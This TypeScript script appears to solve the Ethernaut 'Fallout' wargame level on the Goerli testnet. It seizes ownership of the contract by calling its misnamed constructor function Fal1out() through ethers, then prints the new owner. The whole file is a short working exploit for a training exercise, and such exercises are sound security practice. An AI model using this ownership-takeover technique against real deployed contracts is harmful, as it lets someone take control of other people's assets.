import { ethers } from "ethers";
import { Fallout__factory } from '../typechain-types';

// Task: claim ownership of the contract

const rpc = 'https://rpc.ankr.com/eth_goerli'
const privateKey = ''
const instanceAddress = ''

const main = async () =>  {
    let tx;
  
    const provider = new ethers.JsonRpcProvider(rpc);
    const signer = new ethers.Wallet(privateKey, provider);

    const contract = Fallout__factory.connect(instanceAddress, signer);

    console.log("Hacking the contract...");

    tx = await contract.connect(signer).Fal1out();
    await tx.wait();

    const owner = await contract.owner();

    console.log("Successfully hacked!");
    console.log("Contract owner:", owner);
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});